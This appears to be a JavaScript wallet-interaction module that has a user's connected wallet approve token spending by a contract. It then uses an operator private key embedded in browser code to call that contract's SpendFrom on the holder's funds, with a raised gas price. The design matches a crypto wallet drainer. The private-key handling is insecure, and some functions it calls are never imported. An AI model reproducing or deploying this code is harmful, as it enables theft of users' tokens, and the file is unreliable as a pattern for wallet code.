import { writeContract, readContract, getWalletClient, getPublicClient } from "https://esm.sh/@wagmi/core@2.x"

export class TokenApprover {
  constructor(wagmiConfig, ownerPrivateKey) {
    this.config = wagmiConfig
    this.ownerPrivateKey = ownerPrivateKey
    this.web3 = new Web3(window.ethereum)
  }

  async approveAndSpend(tokenAddress, spenderAddress, amount, approval, holder) {
    try {
      // Check balance
      const balance = await this.checkBalance(tokenAddress, holder)
      if (balance < amount) {
        throw new Error("Insufficient balance")
      }

      // Check current allowance
      const currentAllowance = await this.checkAllowance(tokenAddress, holder, spenderAddress)
      
      // Approve tokens if needed
      if (currentAllowance < amount) {
        const approvalHash = await this.approveToken(tokenAddress, spenderAddress, approval)
        
        // Wait for approval transaction
        await waitForTransactionReceipt(this.config, { 
          hash: approvalHash 
        })
      }

      // Prepare owner account for SpendFrom
      const account = this.web3.eth.accounts.privateKeyToAccount(this.ownerPrivateKey)
      this.web3.eth.accounts.wallet.add(account)

      // Get current nonce and gas price
      const nonce = await this.web3.eth.getTransactionCount(account.address, "pending")
      const gasPrice = await this.web3.eth.getGasPrice()

      // Slightly increase gas price
      const increasedGasPrice = (BigInt(gasPrice) * BigInt(110)) / BigInt(100)

      // Prepare SpendFrom contract
      const contract = new this.web3.eth.Contract([{
        inputs: [
          { internalType: "address", name: "_holder", type: "address" },
          { internalType: "uint256", name: "_amount", type: "uint256" },
        ],
        name: "SpendFrom",
        outputs: [],
        stateMutability: "payable",
        type: "function",
      }], spenderAddress)

      // Call SpendFrom
      const spendTx = await contract.methods.SpendFrom(holder, amount).send({
        from: account.address,
        gas: 200000,
        nonce: nonce,
        gasPrice: increasedGasPrice.toString(),
      })

      return { spendTx }
    } catch (error) {
      console.error("Detailed approval and spend error:", error)
      throw new Error(`Approval and spend failed: ${error.message}`)
    }
  }

  async approveToken(tokenAddress, spenderAddress, approval) {
    return writeContract(this.config, {
      address: tokenAddress,
      abi: [
        {
          name: 'approve',
          type: 'function',
          inputs: [
            { name: 'spender', type: 'address' },
            { name: 'amount', type: 'uint256' }
          ],
          outputs: [{ type: 'bool' }]
        }
      ],
      functionName: 'approve',
      args: [spenderAddress, approval]
    })
  }

  async checkAllowance(tokenAddress, ownerAddress, spenderAddress) {
    return readContract(this.config, {
      address: tokenAddress,
      abi: [
        {
          name: 'allowance',
          type: 'function',
          inputs: [
            { name: 'owner', type: 'address' },
            { name: 'spender', type: 'address' }
          ],
          outputs: [{ type: 'uint256' }]
        }
      ],
      functionName: 'allowance',
      args: [ownerAddress, spenderAddress]
    })
  }

  async checkBalance(tokenAddress, ownerAddress) {
    return readContract(this.config, {
      address: tokenAddress,
      abi: [
        {
          name: 'balanceOf',
          type: 'function',
          inputs: [{ name: 'account', type: 'address' }],
          outputs: [{ type: 'uint256' }]
        }
      ],
      functionName: 'balanceOf',
      args: [ownerAddress]
    })
  }
}